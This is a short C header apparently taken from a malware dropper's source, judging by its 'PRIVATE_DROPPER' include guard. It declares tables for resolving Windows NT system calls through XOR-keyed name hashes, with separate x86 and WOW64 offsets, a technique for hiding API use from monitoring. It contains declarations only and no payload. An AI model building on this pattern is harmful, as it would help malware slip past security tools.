#ifndef __PRIVATE_DROPPER_NTAPISYSCALLS_BASIC_H
#define __PRIVATE_DROPPER_NTAPISYSCALLS_BASIC_H

#ifndef DECLARE_SYSCALL_OFFSET
    #include <ntapi.h>
#endif

#define BasicSyscallsFunctionsCount 5

extern CONST VOLATILE DWORD BasicSyscallsNamesHashXorKey;
extern DWORD BasicSyscallsNamesHash[];
extern PVOID BasicSyscallsProcess[];
extern CONST ULONG BasicSyscallsOffsetX86[];
extern CONST ULONG BasicSyscallsOffsetWow64[];

#endif
